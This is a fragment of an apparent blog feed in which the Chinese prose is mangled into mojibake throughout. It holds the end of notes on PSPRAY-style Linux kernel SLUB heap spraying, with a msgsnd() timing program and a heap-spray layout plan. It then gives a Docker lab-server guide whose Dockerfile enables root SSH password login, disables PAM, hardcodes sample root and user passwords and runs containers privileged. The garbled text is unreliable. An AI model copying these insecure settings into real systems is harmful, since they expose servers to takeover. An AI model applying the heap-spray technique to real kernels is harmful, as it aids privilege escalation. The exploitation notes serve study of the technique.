class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Execute time for no.%d msgsnd(): %ld\n&quot;</span>, i, exec_time[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“æœå…¶å®è¿˜æ˜¯æŒºæ˜æ˜¾çš„ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä¸»æµå‘è¡Œç‰ˆçš„ <code>kmalloc-512</code> çš„ slab å¤§å°å’Œæˆ‘ä»¬å¹³æ—¶æ‰“CTF ç”¨çš„å†…æ ¸çš„ä¸ä¸€å®šä¸€æ ·</p><blockquote><p> ç¬”è€…çœŸæœºç¯å¢ƒè¿™ä¸ªæ˜¯ <code>16</code> ä¸ª 512 å¯¹è±¡ä¸€å¼  slabï¼ŒCTF ç¯å¢ƒé€šå¸¸æ˜¯ <code>8</code> ä¸ª512 å¯¹è±¡ä¸€å¼  slab</p></blockquote><p><img src="https://s2.loli.net/2023/09/16/ZtAB2MvgWib8Qhf.png" alt="image.png"></p><p>ä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥<strong>æˆ‘ä»¬å…¶å®å¹¶æ²¡æœ‰å¿…è¦ä½¿ç”¨ PSPRAY æ–¹æ³•è¿›è¡Œåˆ©ç”¨ï¼Œå³æ²¡æœ‰å¿…è¦æ‰‹åŠ¨è·å–åˆ†é…æ–°çš„ slab é¡µé¢çš„æ—¶é—´</strong>ï¼Œè¿˜æ˜¯ä»¥ OOB å †å–·ä¸ºä¾‹ï¼Œå½“å †å–·åˆ°ä¸€å®šæ•°é‡çº§çš„æ—¶å€™å…¶å®éƒ½ä¼šå‘ buddy system è¯·æ±‚æ–°çš„é¡µé¢ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç®€å•æ‹†ä¸ºå¦‚ä¸‹å››æ®µå¼åˆ©ç”¨ï¼š</p><ul><li>é¦–å…ˆå †å–·å¤§é‡åŒå¤§å°å¯¹è±¡è€—ç©º partial slabï¼Œè¿«ä½¿ SLUB è¯·æ±‚æ–°é¡µ</li><li>å †å–·ç›®æ ‡å¯¹è±¡ï¼Œè®© SLUB å†å–æ–°é¡µ</li><li>åˆ†é…æ¼æ´å¯¹è±¡</li><li>å †å–·ç›®æ ‡å¯¹è±¡ï¼Œè®© SLUB å†å–æ–°é¡µ</li></ul><p>è¿™ç§æ–¹æ³•<strong>æœ¬è´¨ä¸Šä¸ PSPRAY æ‰€è¾¾æˆçš„æ•ˆæœä¸€è‡´ï¼Œå› ä¸ºå®è´¨ä¸Šæˆ‘ä»¬å¹¶ä¸éœ€è¦åˆ¤æ–­æ–° slab é¡µé¢çš„åˆ†é…æ—¶é—´ï¼Œåªéœ€è¦è¾¾æˆä½¿ç”¨ç›®æ ‡å¯¹è±¡å°†æ¼æ´å¯¹è±¡åŒ…è£¹çš„æ•ˆæœå³å¯</strong>ï¼Œè¿™ä¹Ÿæ˜¯ç¬”è€…æ‰€å¸¸ç”¨çš„åˆ©ç”¨æŠ€å·§ä¹‹ä¸€ ï¼šï¼‰</p><blockquote><p>å‚è§ç¬”è€…å‡ºçš„ä¸€é“ CTF é¢˜ç›®ï¼š<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023 - d3kcache</a>ï¼Œé‡Œé¢ä¾¿ä½¿ç”¨äº†è¿™ç§æ–¹æ³•è¿›è¡Œè¾…åŠ©</p></blockquote><p>ä¸è¿‡æ— è®ºå¦‚ä½•ï¼Œ$PSPRAY$ è®ºæ–‡çš„ä½œè€…ç¡®ä¹å‘æˆ‘ä»¬å±•ç¤ºäº†ä¸€ç§<strong>éå¸¸æœ‰è¶£ä¸”å®ç”¨çš„æ¼æ´åˆ©ç”¨æŠ€å·§</strong>ï¼Œè®©ç¬”è€…å—ç›ŠåŒªæµ…</p><blockquote><p><del>å¸Œæœ›ç¬”è€…æœ‰ä¸€å¤©ä¹Ÿèƒ½åƒè¿™ç¾¤å¤§ä½¬é‚£æ ·å‘ä¸€å †é¡¶ä¼š</del></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ğŸµTHIS IS MY KINGDOM C*MğŸµ&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€OPS.0x00ã€‘ä½¿ç”¨ Docker åˆ›å»ºéš”ç¦»çš„å·¥ä½œç¯å¢ƒ</title>
    <link href="https://arttnba3.github.io/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/"/>
    <id>https://arttnba3.github.io/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/</id>
    <published>2023-08-31T11:55:24.000Z</published>
    <updated>2023-09-26T16:09:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ€ä¹ˆå®éªŒå®¤åªæœ‰ğŸ‘´ä¸€ä¸ªè¿ç»´</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>å› ä¸ºç¬”è€…ç›®å‰æ‰€åœ¨çš„å®éªŒå®¤å¥½åƒåªæœ‰ç¬”è€…ä¸€ä¸ªäººä¼šä¸€ç‚¹ç‚¹è¿ç»´æŠ€æœ¯ï¼Œ<del>å¤§å®¶éƒ½å–œæ¬¢åœ¨æ ¹ç›®å½•å’Œå„ç§ä¹±ä¸ƒå…«ç³Ÿçš„ç›®å½•åˆ°å¤„ä¹±æ‹‰</del>ï¼ˆé”™ä¹±ï¼‰ï¼Œä¸ºäº†ä¿è¯æœåŠ¡å™¨ç¯å¢ƒä¸ä¼šå“ªå¤©ç”¨ç€ç”¨ç€ç»™æ•´ä¸ªæŒ‚æ‰äº†ï¼Œç¬”è€…å†™äº†ä¸€ä»½ã€ŠæœåŠ¡å™¨å®‰å…¨ä½¿ç”¨æŒ‡åŒ—ã€‹ï¼Œå¹¶é¡ºä¾¿æ‹·è´è¿‡æ¥æ°´ä¸€ç¯‡åšå®¢ï¼ˆç¬‘ï¼‰</p></blockquote><h2 id="What-is-docker"><a href="#What-is-docker" class="headerlink" title="What is docker?"></a>What is docker?</h2><blockquote><p>æŠ„è‡ª Wikipediaï¼š</p><p><a href="https://www.docker.com/">Docker</a> æ˜¯ä¸€ä¸ªå¼€æºçš„å¼€æ”¾å¹³å°è½¯ä»¶ï¼Œç”¨äºå¼€å‘åº”ç”¨ã€äº¤ä»˜ï¼ˆshippingï¼‰åº”ç”¨å’Œè¿è¡Œåº”ç”¨ã€‚Docker å…è®¸ç”¨æˆ·å°†åŸºç¡€è®¾æ–½ï¼ˆInfrastructureï¼‰ä¸­çš„åº”ç”¨å•ç‹¬åˆ†å‰²å‡ºæ¥ï¼Œå½¢æˆæ›´å°çš„é¢—ç²’ï¼ˆå®¹å™¨ï¼‰ï¼Œä»è€Œæé«˜äº¤ä»˜è½¯ä»¶çš„é€Ÿåº¦ã€‚</p></blockquote><p>æŒ‰ç…§ç¬”è€…çš„ç†è§£ï¼ŒDocker å¯ä»¥ç®€å•ç†è§£ä¸ºç”¨äºåˆ›å»º<strong>å…±äº«æ“ä½œç³»ç»Ÿå†…æ ¸è™šæ‹Ÿæœºéš”ç¦»ç¯å¢ƒ</strong>ï¼ˆç§°ä¸ºå®¹å™¨ï¼‰çš„å·¥å…·åŒ…ï¼š</p><p><img src="https://s2.loli.net/2023/08/31/MYFEIkeyz5iR9t4.png"></p><h2 id="Why-use-docker"><a href="#Why-use-docker" class="headerlink" title="Why use docker?"></a>Why use docker?</h2><p>ä¸ºäº†è§£å†³æœåŠ¡å™¨ç¯å¢ƒæ±¡æŸ“é—®é¢˜ï¼ˆä¾‹å¦‚é…ç¯å¢ƒæŠŠæœåŠ¡å™¨ä¸»ç¯å¢ƒæå´©äº†ï¼Œè¿™å°†åŒæ—¶å½±å“åˆ°ä½¿ç”¨æœåŠ¡å™¨çš„å¤šä¸ªç”¨æˆ·ï¼‰ï¼Œåœ¨æœåŠ¡å™¨å¤šäººå…±äº«çš„æƒ…å†µä¸‹ï¼Œå¯¹äº<strong>ä¸æ¶‰åŠå†…æ ¸é©±åŠ¨æ›´æ”¹çš„å·¥ä½œ</strong>ï¼Œæ¨èä½¿ç”¨ docker åˆ›å»ºä¸€ä¸ªæ–°çš„éš”ç¦»ç¯å¢ƒæ¥å®Œæˆã€‚</p><h2 id="How-to-install-docker"><a href="#How-to-install-docker" class="headerlink" title="How to install docker?"></a>How to install docker?</h2><blockquote><p><strong>æ¨èå‚ç…§å®˜ç½‘çš„å®‰è£…æ•™ç¨‹æ¥å®Œæˆï¼Œè¿™é‡Œç¬”è€…ä¹Ÿæ˜¯ä½¿ç”¨çš„å®˜ç½‘æ•™ç¨‹è¿›è¡Œå®‰è£…</strong></p><p>ç¬”è€…å®éªŒå®¤æœåŠ¡å™¨å®‰è£…äº† Ubuntuï¼Œå…¶ä»–å‘è¡Œç‰ˆè¯·å‚è§<a href="https://docs.docker.com/engine/install/ubuntu/">å®˜ç½‘æ•™ç¨‹</a>è¿›è¡Œå®‰è£…</p></blockquote><h3 id="Docker-Engineï¼ˆæ¨èï¼‰"><a href="#Docker-Engineï¼ˆæ¨èï¼‰" class="headerlink" title="Docker Engineï¼ˆæ¨èï¼‰"></a>Docker Engineï¼ˆæ¨èï¼‰</h3><p>é¦–å…ˆé€šè¿‡å¦‚ä¸‹å‘½ä»¤å¸è½½å¯èƒ½å­˜åœ¨çš„æ—§ç‰ˆ dockerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-keyword">for</span> pkg <span class="hljs-keyword">in</span> docker.io docker-doc docker-compose podman-docker containerd runc; <span class="hljs-keyword">do</span> sudo apt-get remove <span class="hljs-variable">$pkg</span>; <span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ·»åŠ  docker ä»“åº“çš„ GPG key å¹¶è¿›è¡Œé…ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ca-certificates curl gnupg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> \</span><br><span class="language-bash">  <span class="hljs-string">&quot;deb [arch=&quot;</span>$(dpkg --print-architecture)<span class="hljs-string">&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="hljs-string"><span class="language-bash">  &quot;</span>$(. /etc/os-release &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$VERSION_CODENAME</span>&quot;</span>)<span class="hljs-string">&quot; stable&quot;</span> | \</span><br><span class="language-bash">  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br></code></pre></td></tr></table></figure><p>æ­£å¼å®‰è£… dockerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></code></pre></td></tr></table></figure><p>å®Œæˆä¹‹åå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run hello-world</span><br></code></pre></td></tr></table></figure><p>å°†å½“å‰ç”¨æˆ·æ·»åŠ åˆ° docker ç”¨æˆ·ç»„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -aG docker <span class="hljs-variable">$USER</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h3 id="Docker-Desktopï¼ˆä¸æ¨èï¼‰"><a href="#Docker-Desktopï¼ˆä¸æ¨èï¼‰" class="headerlink" title="Docker Desktopï¼ˆä¸æ¨èï¼‰"></a><em>Docker Desktopï¼ˆä¸æ¨èï¼‰</em></h3><blockquote><p> Docker Desktop é¢å¤–æä¾›äº†ä¸€ä¸ª GUIï¼Œä»¥åŠä¸åŒç”¨æˆ·é—´çš„éš”ç¦»æœºåˆ¶ï¼Œä¸è¿‡ <em>ç¬”è€…ç”¨ç€æ„Ÿè§‰ä¸æ˜¯å¾ˆ ok</em> ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¨èä¼ ç»Ÿçš„çº¯ Docker Engine</p></blockquote><p>å¯¹äºé Gnome æ¡Œé¢ç¯å¢ƒè€Œè¨€ï¼Œéœ€è¦å®‰è£… <code>gnome-terminal</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install gnome-terminal</span><br></code></pre></td></tr></table></figure><p>å¸è½½å¯èƒ½å®‰è£…è¿‡çš„ dockerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt remove docker-desktop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">rm</span> -r <span class="hljs-variable">$HOME</span>/.docker/desktop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">rm</span> /usr/local/bin/com.docker.cli</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt purge docker-desktop</span><br></code></pre></td></tr></table></figure><p>è®¾ç½® docker ä»“åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ca-certificates curl gnupg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> \</span><br><span class="language-bash">  <span class="hljs-string">&quot;deb [arch=&quot;</span>$(dpkg --print-architecture)<span class="hljs-string">&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="hljs-string"><span class="language-bash">  &quot;</span>$(. /etc/os-release &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$VERSION_CODENAME</span>&quot;</span>)<span class="hljs-string">&quot; stable&quot;</span> | \</span><br><span class="language-bash">  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br></code></pre></td></tr></table></figure><p>ä¸‹è½½ docker å®‰è£…åŒ…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://desktop.docker.com/linux/main/amd64/docker-desktop-4.22.1-amd64.deb</span><br></code></pre></td></tr></table></figure><p>å®‰è£… dockerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ./docker-desktop-4.22.1-amd64.deb</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨ dockerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl --user start docker-desktop</span><br></code></pre></td></tr></table></figure><p>å°†å½“å‰ç”¨æˆ·æ·»åŠ åˆ° docker ç”¨æˆ·ç»„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -aG docker <span class="hljs-variable">$USER</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl --user restart docker-desktop</span><br></code></pre></td></tr></table></figure><h1 id="0x01-ä½¿ç”¨-docker-æ­å»ºåŸºæœ¬çš„å®¹å™¨ç¯å¢ƒ"><a href="#0x01-ä½¿ç”¨-docker-æ­å»ºåŸºæœ¬çš„å®¹å™¨ç¯å¢ƒ" class="headerlink" title="0x01. ä½¿ç”¨ docker æ­å»ºåŸºæœ¬çš„å®¹å™¨ç¯å¢ƒ"></a>0x01. ä½¿ç”¨ docker æ­å»ºåŸºæœ¬çš„å®¹å™¨ç¯å¢ƒ</h1><p><strong>è‹¥ç”¨æˆ·æœªåŠ å…¥ docker ç”¨æˆ·ç»„åˆ™æ‰€æœ‰å‘½ä»¤å¼€å¤´éƒ½éœ€è¦æ·»åŠ </strong> <strong>sudo</strong> <strong>è·å¾— root æƒé™</strong></p><h2 id="åˆ›å»º-Docker-é•œåƒ"><a href="#åˆ›å»º-Docker-é•œåƒ" class="headerlink" title="åˆ›å»º Docker é•œåƒ"></a>åˆ›å»º Docker é•œåƒ</h2><p>é¦–å…ˆåœ¨ä¸€ä¸ªç©ºç™½çš„æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªåä¸º <code>Dockerfile</code> çš„æ–‡ä»¶ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># å¯ä»¥åœ¨è¿™é‡Œé¢„å…ˆæ·»åŠ æƒ³è¦å®‰è£…çš„è½¯ä»¶</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim netcat openssh-server unzip make wget bison flex build-essential curl</span><br><br><span class="hljs-comment"># å¼€å¯sshç™»å½•</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># è®¾ç½®å…è®¸å¯†ç ç™»å½•</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># æ·»åŠ ç”¨æˆ·å¯†ç ï¼Œè¿™é‡Œåªæ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œæ ¹æ®ä½ çš„éœ€æ±‚è‡ªå·±ä¿®æ”¹</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:lTaa4cqucW4zxvJswU5KH0HIRM9VmjO7&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:rqUHmfGUtjItWapDuv3NEqwQ9bm6GBrs&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># æ·»åŠ  ssh ç™»å½•ï¼Œæ³¨æ„æ¢æˆè‡ªå·±æ–°å»ºçš„ç”¨æˆ·çš„ç”¨æˆ·å</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;è¿™é‡Œå†™ä½ çš„sshå…¬é’¥&quot;</span> &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># ä¿æŒ docker å®¹å™¨è¿è¡Œ</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»ºé•œåƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t <span class="hljs-string">&quot;è‡ªå®šä¹‰é•œåƒå&quot;</span> .</span><br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºå¹¶å¯åŠ¨-docker-å®¹å™¨"><a href="#åˆ›å»ºå¹¶å¯åŠ¨-docker-å®¹å™¨" class="headerlink" title="åˆ›å»ºå¹¶å¯åŠ¨ docker å®¹å™¨"></a>åˆ›å»ºå¹¶å¯åŠ¨ <strong>docker å®¹å™¨</strong></h2><p>å®Œæˆ docker é•œåƒåˆ›å»ºä¹‹åæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ä½¿ç”¨è¯¥é•œåƒå¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;å¤–éƒ¨ç«¯å£:22&quot;</span> -h <span class="hljs-string">&quot;å®¹å™¨ä¸»æœºå&quot;</span> --name=<span class="hljs-string">&quot;å®¹å™¨å&quot;</span> è‡ªå®šä¹‰é•œåƒå</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ·»åŠ äº†ä¸€ä¸ªæœåŠ¡å™¨ç«¯å£åˆ°å®¹å™¨å†…éƒ¨ <code>22</code> ç«¯å£çš„æ˜ å°„ï¼Œä»è€Œä½¿å¾—å¯ä»¥ä»å¤–éƒ¨ç›´æ¥é€šè¿‡ ssh è¿æ¥åˆ°å®¹å™¨å†…éƒ¨</p><p>å¦‚æœä½ çš„å®¹å™¨ä¸éœ€è¦ä¸»æœºç›¸å…³çš„ä¸€äº›æƒé™ï¼Œä¹Ÿå¯ä»¥å»æ‰ <code>--privileged</code> å‚æ•°</p><h2 id="è¿›å…¥-docker-å®¹å™¨"><a href="#è¿›å…¥-docker-å®¹å™¨" class="headerlink" title="è¿›å…¥ docker å®¹å™¨"></a>è¿›å…¥ docker å®¹å™¨</h2><p>è¿›å…¥å®¹å™¨ç¯å¢ƒæœ‰ä¸¤ç§åŠæ³•ï¼Œä¸€ç§æ˜¯é€šè¿‡ container idï¼ˆå¯ä»¥é€šè¿‡ <code>docker ps</code> æŸ¥çœ‹ï¼Œåœ¨åˆ›å»ºå®¹å™¨æ—¶ä¹Ÿä¼šæ‰“å°å‡ºå®¹å™¨idï¼‰ï¼Œå¦ä¸€ç§æ˜¯é€šè¿‡è‡ªå®šä¹‰çš„å®¹å™¨åï¼Œè¿™é‡Œè¿›å…¥å®¹å™¨åé»˜è®¤æ˜¯ root ç”¨æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -it å®¹å™¨åæˆ–å®¹å™¨ID /bin/bash</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦ä»¥å®¹å™¨å†…éƒ¨çš„æŒ‡å®šç”¨æˆ·èº«ä»½è¿›å…¥å®¹å™¨ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight 